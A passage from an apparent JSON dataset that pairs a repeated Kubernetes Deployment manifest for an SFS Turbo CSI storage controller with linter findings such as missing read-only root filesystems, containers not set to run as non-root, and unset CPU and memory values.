ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "04145",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sfs-turbo-csi-plugin\" does not have a read-only root file system"
  },
  {
    "id": "04146",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-attacher\" is not set to runAsNonRoot"
  },
  {
    "id": "04147",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "04148",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"liveness-probe\" is not set to runAsNonRoot"
  },
  {
    "id": "04149",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sfs-turbo-csi-plugin\" is not set to runAsNonRoot"
  },
  {
    "id": "04150",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-attacher\" has cpu request 0"
  },
  {
    "id": "04151",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-provisioner\" has cpu request 0"
  },
  {
    "id": "04152",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness-probe\" has cpu request 0"
  },
  {
    "id": "04153",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sfs-turbo-csi-plugin\" has cpu request 0"
  },
  {
    "id": "04154",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-attacher\" has memory limit 0"
  },
  {
    "id": "04155",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-provisioner\" has memory limit 0"
  },
  {
    "id": "04156",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
